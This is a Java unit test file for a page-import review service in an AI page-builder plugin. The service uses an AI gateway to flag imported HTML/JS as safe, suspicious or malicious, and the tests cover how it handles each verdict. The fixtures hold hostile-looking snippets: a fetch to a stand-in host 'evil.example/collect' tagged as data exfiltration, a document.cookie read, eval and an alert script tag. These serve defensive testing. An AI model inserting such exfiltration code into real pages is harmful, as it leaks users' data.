package run.halo.aipagebuilder.page;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import java.security.MessageDigest;
import java.time.Instant;
import java.util.HexFormat;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.springframework.http.HttpStatus;
import org.springframework.web.server.ResponseStatusException;
import reactor.core.publisher.Mono;
import run.halo.aipagebuilder.ai.AiEndpoint;
import run.halo.aipagebuilder.ai.AiGateway;
import run.halo.aipagebuilder.ai.AiReview;
import run.halo.aipagebuilder.ai.AiReviewException;
import run.halo.aipagebuilder.content.ContentPolicy;

class PageImportReviewServiceTest {
    private final AiGateway gateway = mock(AiGateway.class);
    private final ImportReviewStore store = new ImportReviewStore();
    private final PageImportReviewService service =
        new PageImportReviewService(gateway, new ContentPolicy(), store);

    @BeforeEach
    void setUp() {
        when(gateway.status()).thenReturn(Mono.just(new AiEndpoint.AiStatus(true, "ok")));
    }

    @Test
    void safeReviewIsStoredAndAuthorizesImport() throws Exception {
        var bytes = archive("<p>Hello</p>", "p {color: red}", "console.log('ok')");
        when(gateway.review(anyString(), anyString()))
            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("safe");
        assertThat(report.findings()).isEmpty();
        assertThat(report.title()).isEqualTo("Test");
        assertThat(report.themeLayout()).isFalse();
        assertThat(report.expiresAt()).isAfter(Instant.now());
        assertThat(service.authorize(report.reviewId(), bytes, "admin", false).block()).isNull();
    }

    @Test
    void smallArchiveIsReviewedInOneRequestWithEveryFile() throws Exception {
        var prompt = new AtomicReference<String>();
        when(gateway.review(anyString(), anyString())).thenAnswer(invocation -> {
            prompt.set(invocation.getArgument(1));
            return Mono.just(review(AiReview.Verdict.SAFE));
        });

        var report = service.review(
            archive("<p>Hello</p>", "p {color: red}", "console.log('ok')"), "admin").block();

        assertThat(report.verdict()).isEqualTo("safe");
        verify(gateway, times(1)).review(anyString(), anyString());
        assertThat(prompt.get())
            .contains("页面包文件：")
            .contains("本次审查提供：page.html、styles.css、script.js")
            .contains("=== 文件：page.html", "=== 文件：styles.css", "=== 文件：script.js");
    }

    @Test
    void selectedModelIsUsedForReview() throws Exception {
        when(gateway.review(eq("model-a"), anyString(), anyString()))
            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));

        var report = service.review(
            archive("<p>Hello</p>", "", "console.log('ok')"), "admin", "model-a").block();

        assertThat(report.verdict()).isEqualTo("safe");
        verify(gateway).review(eq("model-a"), anyString(), anyString());
        verify(gateway, never()).review(anyString(), anyString());
    }

    @Test
    void suspiciousReviewRequiresConfirmation() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "eval('code')");
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
            AiReview.Verdict.SUSPICIOUS, finding(AiReview.Severity.MEDIUM,
                AiReview.Category.OBFUSCATION, "script.js", "eval('code')"))));

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("suspicious");
        assertThat(report.findings()).hasSize(1);
        assertThatThrownBy(() -> service.authorize(report.reviewId(), bytes, "admin", false)
            .block()).isInstanceOfSatisfying(ResponseStatusException.class,
                error -> assertThat(error.getStatusCode())
                    .isEqualTo(HttpStatus.UNPROCESSABLE_ENTITY));
        assertThat(service.authorize(report.reviewId(), bytes, "admin", true).block()).isNull();
    }

    @Test
    void maliciousReviewBlocksImportEvenWhenConfirmed() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "document.cookie");
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
            AiReview.Verdict.MALICIOUS, finding(AiReview.Severity.CRITICAL,
                AiReview.Category.DATA_EXFILTRATION, "script.js", "document.cookie"))));

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("malicious");
        assertThatThrownBy(() -> service.authorize(report.reviewId(), bytes, "admin", true)
            .block()).isInstanceOfSatisfying(ResponseStatusException.class,
                error -> assertThat(error.getStatusCode())
                    .isEqualTo(HttpStatus.UNPROCESSABLE_ENTITY));
    }

    @Test
    void highSeverityFindingUpgradesSafeVerdict() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "fetch('https://evil.example')");
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
            AiReview.Verdict.SAFE, finding(AiReview.Severity.HIGH,
                AiReview.Category.DATA_EXFILTRATION, "script.js", "fetch("))));

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("malicious");
        assertThat(report.summary()).contains("恶意");
    }

    @Test
    void mediumSeverityFindingUpgradesSafeVerdictToSuspicious() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "eval('code')");
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
            AiReview.Verdict.SAFE, finding(AiReview.Severity.MEDIUM,
                AiReview.Category.OBFUSCATION, "script.js", "eval("))));

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("suspicious");
        assertThat(report.summary()).contains("可疑");
    }

    @Test
    void largeScriptIsReviewedInChunksAndFindingsAreDeduplicated() throws Exception {
        var script = "// padding\n".repeat(7000) + "fetch('https://evil.example/collect');";
        var bytes = archive("<p>Hello</p>", "", script);
        var calls = new AtomicInteger();
        when(gateway.review(anyString(), anyString())).thenAnswer(invocation -> {
            calls.incrementAndGet();
            return Mono.just(review(AiReview.Verdict.MALICIOUS,
                finding(AiReview.Severity.HIGH, AiReview.Category.DATA_EXFILTRATION,
                    "script.js", "fetch('https://evil.example/collect')")));
        });

        var report = service.review(bytes, "admin").block();

        assertThat(calls.get()).isGreaterThan(1);
        assertThat(report.findings()).hasSize(1);
        assertThat(report.verdict()).isEqualTo("malicious");
    }

    @Test
    void emptySourceFilesStillRunOneMetadataReview() throws Exception {
        var bytes = archive("", "", "");
        var prompt = new AtomicReference<String>();
        when(gateway.review(anyString(), anyString())).thenAnswer(invocation -> {
            prompt.set(invocation.getArgument(1));
            return Mono.just(review(AiReview.Verdict.SAFE));
        });

        var report = service.review(bytes, "admin").block();

        assertThat(report.verdict()).isEqualTo("safe");
        assertThat(prompt.get()).contains("仅页面元数据", "页面标题：Test");
        verify(gateway).review(anyString(), anyString());
    }

    @Test
    void malformedFindingFailsClosed() throws Exception {
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(
            new AiReview(AiReview.Verdict.SAFE, "summary", List.of(
                new AiReview.Finding(null, AiReview.Category.OTHER, "script.js", "", "")))));
        var bytes = archive("<p>Hello</p>", "", "");

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
    }

    @Test
    void emptyChunkResultFailsClosed() throws Exception {
        when(gateway.review(anyString(), anyString())).thenReturn(Mono.empty());
        var bytes = archive("<p>Hello</p>", "", "");

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
    }

    @Test
    void contentPolicyFailureSkipsAi() throws Exception {
        var bytes = archive("<script>alert(1)</script>", "", "");

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
        verify(gateway, never()).review(anyString(), anyString());
    }

    @Test
    void unavailableStatusBlocksReview() throws Exception {
        when(gateway.status()).thenReturn(
            Mono.just(new AiEndpoint.AiStatus(false, "disabled")));
        var bytes = archive("<p>Hello</p>", "", "");

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error -> {
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE);
                assertThat(error.getReason()).contains("disabled");
            });
        verify(gateway, never()).review(anyString(), anyString());
    }

    @Test
    void statusFailureBlocksReview() throws Exception {
        when(gateway.status()).thenReturn(Mono.error(new IllegalStateException("boom")));
        var bytes = archive("<p>Hello</p>", "", "");

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE));
        verify(gateway, never()).review(anyString(), anyString());
    }

    @ParameterizedTest
    @EnumSource(AiReviewException.Reason.class)
    void reviewFailureMapsToHttpStatus(AiReviewException.Reason reason) throws Exception {
        when(gateway.review(anyString(), anyString()))
            .thenReturn(Mono.error(new AiReviewException(reason)));
        var bytes = archive("<p>Hello</p>", "", "");
        var expected = switch (reason) {
            case UNAVAILABLE -> HttpStatus.SERVICE_UNAVAILABLE;
            case TIMEOUT -> HttpStatus.GATEWAY_TIMEOUT;
            case INVALID_OUTPUT, FAILED -> HttpStatus.BAD_GATEWAY;
        };

        assertThatThrownBy(() -> service.review(bytes, "admin").block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(expected));
    }

    @Test
    void authorizeRejectsMissingActorMismatchAndHashMismatch() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "");
        when(gateway.review(anyString(), anyString()))
            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
        var report = service.review(bytes, "admin").block();

        assertThatThrownBy(() -> service.authorize(null, bytes, "admin", false).block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
        assertThatThrownBy(() -> service.authorize("missing", bytes, "admin", false).block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
        assertThatThrownBy(() -> service.authorize(report.reviewId(), bytes, "other", false)
            .block()).isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
        assertThatThrownBy(() -> service.authorize(report.reviewId(),
            archive("<p>Changed</p>", "", ""), "admin", false).block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
    }

    @Test
    void authorizeRejectsExpiredAndUnknownReviews() throws Exception {
        var bytes = archive("<p>Hello</p>", "", "");
        var expired = new PageApi.ImportReview("expired", "safe", "summary", List.of(),
            "Test", "", false, Instant.now().minusSeconds(1));
        store.put("admin", sha256(bytes), expired);
        var unknown = new PageApi.ImportReview("unknown", "unexpected", "summary", List.of(),
            "Test", "", false, Instant.now().plusSeconds(600));
        store.put("admin", sha256(bytes), unknown);

        assertThatThrownBy(() -> service.authorize("expired", bytes, "admin", false).block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
        assertThatThrownBy(() -> service.authorize("unknown", bytes, "admin", false).block())
            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
    }

    private static byte[] archive(String html, String css, String js) throws Exception {
        var files = new LinkedHashMap<String, String>();
        files.put("page.json", """
            {"format":"ai-page-builder","version":1,"title":"Test","description":"",
             "themeLayout":false}
            """);
        files.put("page.html", html);
        files.put("styles.css", css);
        files.put("script.js", js);
        return PageArchiveTest.zip(files);
    }

    private static AiReview review(AiReview.Verdict verdict, AiReview.Finding... findings) {
        return new AiReview(verdict, "summary", List.of(findings));
    }

    private static AiReview.Finding finding(AiReview.Severity severity,
        AiReview.Category category, String file, String evidence) {
        return new AiReview.Finding(severity, category, file, evidence, "explanation");
    }

    private static String sha256(byte[] bytes) throws Exception {
        return HexFormat.of().formatHex(
            MessageDigest.getInstance("SHA-256").digest(bytes));
    }
}
